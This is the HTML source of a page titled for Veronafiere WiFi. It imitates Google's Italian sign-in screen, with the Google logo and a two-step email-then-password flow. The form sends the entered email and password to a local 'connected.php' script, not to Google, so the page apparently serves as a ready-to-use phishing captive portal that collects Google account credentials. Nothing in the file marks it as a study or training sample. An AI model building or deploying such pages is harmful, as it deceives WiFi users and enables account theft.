<!doctype html>
<html lang="it">
<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/all.min.css">
    <link rel="stylesheet" href="css/style.css">

    <link rel="shortcut icon" href="img/favicon-2018.png">
    <title>Accedi con Google | Veronafiere WiFi</title>
</head>
<body>
<main class="bg-white google-page">

    <div class="container">
        <div class="row justify-content-md-center">
            <div class="col-sm-12 col-md-7 col-lg-5">
                <div class="card mt-5 mb-5 pl-2 pr-2 pt-5 pb-5">
                    <div class="card-body">
                        <p class="text-center"><img src="img/Google_2015_logo.svg" height="30" alt="Google Login"></p>
                        <h3 class="card-title text-center pb-2 m-0 mb-2">Accedi</h3>
                        <h5 class="card-title text-center pb-2 m-0 mb-3">Utilizza il tuo Account Google</h5>

                        <form method="post" action="connected.php">
                            <div class="form-group">
                                <input type="email" class="form-control" name="email" id="email-input"
                                       placeholder="E-mail o numero di telefono" height="45">
                                <input type="password" class="form-control" name="password" id="pwd-input"
                                       placeholder="Password" height="45">
                            </div>
                            <a href="#" class="mt-0 mb-5" id="form-lbl">Non ricordi l'indirizzo e-mail?</a>
                            <p class="mt-5" style="font-size: 90%; color: #454545;">Non si tratta del tuo computer? Utilizza una finestra privata per accedere.
                                <a href="#">Ulteriori informazioni</a>
                            </p>
                            <p class="text-right">
                                <a href="#" class="btn btn-primary pr-4 pl-4" id="next-btn">Avanti</a>
                                <button type="submit" class="btn btn-primary pr-4 pl-4" id="login-btn">Accedi</button>
                            </p>
                        </form>
                    </div>
                </div>

            </div>
        </div>
    </div>
</main>

<script src="js/jquery-3.4.1.min.js"></script>
<script src="js/popper.min.js"></script>
<script src="js/bootstrap.min.js"></script>

<script>
    $(document).ready(function () {
        $('#pwd-input').hide();
        $('#login-btn').hide();

        $('#next-btn').on('click', function () {
            if ($('#email-input').val() !== "")
            {
                $('#email-input').fadeOut();
                $('#pwd-input').fadeIn();
                $('#form-lbl').text("Password dimenticata?");
                $('#next-btn').fadeOut();
                $('#login-btn').fadeIn();
            }
        });
    });
</script>
</body>
</html>